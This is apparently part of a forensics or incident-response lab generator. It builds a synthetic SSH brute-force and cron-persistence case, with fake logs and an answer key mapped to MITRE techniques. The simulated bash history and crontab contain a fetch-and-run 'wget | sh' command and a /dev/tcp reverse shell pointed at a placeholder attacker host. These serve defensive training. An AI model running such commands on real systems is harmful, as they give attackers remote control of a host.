    case_dir = create_case("Lab-Breach-02-SSH", investigator, notes="Demo case: SSH brute force + cron persistence", root=root, host=host)
    collected = now_utc()
    t0 = (collected - timedelta(minutes=30)).replace(second=0, microsecond=0)
    update_case(case_dir, incident_window={"start": iso(t0 - timedelta(days=7)), "end": None})
    case = json.loads((case_dir / "case.json").read_text())
    ctx = Ctx(case_dir, case)
    lines = [f"{iso(t0 - timedelta(minutes=20))[:-1]}+00:00 victim-lnx CRON[811]: pam_unix(cron:session): session opened for user root(uid=0)"]
    for i in range(30):
        t = t0 + timedelta(seconds=3 * i)
        lines.append(f"{iso(t)[:-1]}+00:00 victim-lnx sshd[{2100 + i}]: Failed password for labadmin from {ATTACKER} port {41000 + i} ssh2")
    t = t0 + timedelta(seconds=95)
    lines.append(f"{iso(t)[:-1]}+00:00 victim-lnx sshd[2140]: Accepted password for labadmin from {ATTACKER} port 41031 ssh2")
    t2 = t0 + timedelta(minutes=4)
    lines.append(f"{iso(t2)[:-1]}+00:00 victim-lnx sudo[2201]: labadmin : TTY=pts/0 ; PWD=/home/labadmin ; USER=root ; COMMAND=/usr/sbin/useradd -m sysupdate")
    lines.append(f"{iso(t2 + timedelta(seconds=1))[:-1]}+00:00 victim-lnx useradd[2202]: new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/sh")
    p = case_dir / "raw/logs/auth.log"
    p.write_text("\n".join(lines) + "\n")
    ctx.register("logs", p)
    hist = case_dir / "raw/logs/bash_history_labadmin"
    ts = int((t0 + timedelta(minutes=3)).timestamp())
    hist.write_text(f"#{ts}\nid\n#{ts + 30}\nwget -qO- http://{ATTACKER}:8000/x.sh | sh\n#{ts + 200}\n"
                    f"(crontab -l; echo '*/5 * * * * bash -c \"bash -i >& /dev/tcp/{ATTACKER}/4444 0>&1\"') | crontab -\n#{ts + 260}\nhistory -c\n")
    ctx.register("logs", hist)
    cron = case_dir / "raw/logs/cron/var_spool_cron_crontabs_labadmin"
    cron.parent.mkdir(parents=True, exist_ok=True)
    cron.write_text(f'*/5 * * * * bash -c "bash -i >& /dev/tcp/{ATTACKER}/4444 0>&1"\n')
    m = (t0 + timedelta(minutes=6)).timestamp()
    os.utime(cron, (m, m))
    ctx.register("logs", cron)
    ctx.write_json("network", "raw/live/netconns.json", [{"proto": "tcp", "laddr": "192.168.56.11", "lport": 51522, "raddr": ATTACKER,
                                                          "rport": 4444, "state": "ESTABLISHED", "pid": 2290, "process": "bash",
                                                          "created": iso(t0 + timedelta(minutes=10))}])
    ctx.write_json("processes", "raw/live/processes.json", [
        {"pid": 1, "ppid": 0, "name": "systemd", "parent_name": None, "path": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init", "user": "root"},
        {"pid": 2290, "ppid": 2288, "name": "bash", "parent_name": "cron", "path": "/usr/bin/bash",
         "cmdline": f"bash -i", "user": "labadmin", "start_time": iso(t0 + timedelta(minutes=10))}])
    ctx.write_json("snapshot", "raw/live/snapshot.json", {"snapshot": "incident", "taken_at": iso(collected), "items": {}})
    sign_manifest(case_dir)
    update_case(case_dir, status="collected", collected_at=iso(collected))
    (case_dir / "lab_truth.json").write_text(json.dumps({"steps": ["ssh"], "attack_start": iso(t0), "truth": [
        {"step": "ssh-bruteforce", "ts": iso(t), "techniques": ["T1110"]}, {"step": "useradd", "ts": iso(t2), "techniques": ["T1136.001"]},
        {"step": "download", "ts": iso(t0 + timedelta(minutes=3, seconds=30)), "techniques": ["T1059.004"]},
        {"step": "cron", "ts": iso(t0 + timedelta(minutes=6)), "techniques": ["T1053.003"]}]}, indent=1))
    return case_dir
